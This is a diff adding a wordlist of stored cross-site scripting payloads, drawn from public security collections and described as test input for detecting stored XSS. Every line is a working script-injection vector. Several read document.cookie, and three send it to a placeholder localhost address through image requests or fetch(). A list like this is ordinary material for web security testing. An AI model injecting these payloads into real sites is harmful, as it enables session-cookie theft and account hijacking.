@@ -1,0 +1,19 @@
+# XSS Stored Payloads
+# Sources: SecLists, PayloadsAllTheThings
+# Purpose: Detect stored XSS; these payloads persist and execute on later page loads.
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(document.cookie)>
+<script>new Image().src='http://localhost/?c='+document.cookie</script>
+<script>fetch('http://localhost/?c='+document.cookie)</script>
+<body onload=alert(document.cookie)>
+<iframe src=javascript:alert(document.cookie)>
+<input autofocus onfocus=alert(document.cookie)>
+<svg><script>alert(document.cookie)</script></svg>
+<img src=1 onerror=this.src='http://localhost/?c='+document.cookie>
+<script>setTimeout(function(){alert(document.cookie)},100)</script>
+<script>document.write('<img src=x onerror=alert(document.cookie)>')</script>
+"><script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+<script>alert(1)//
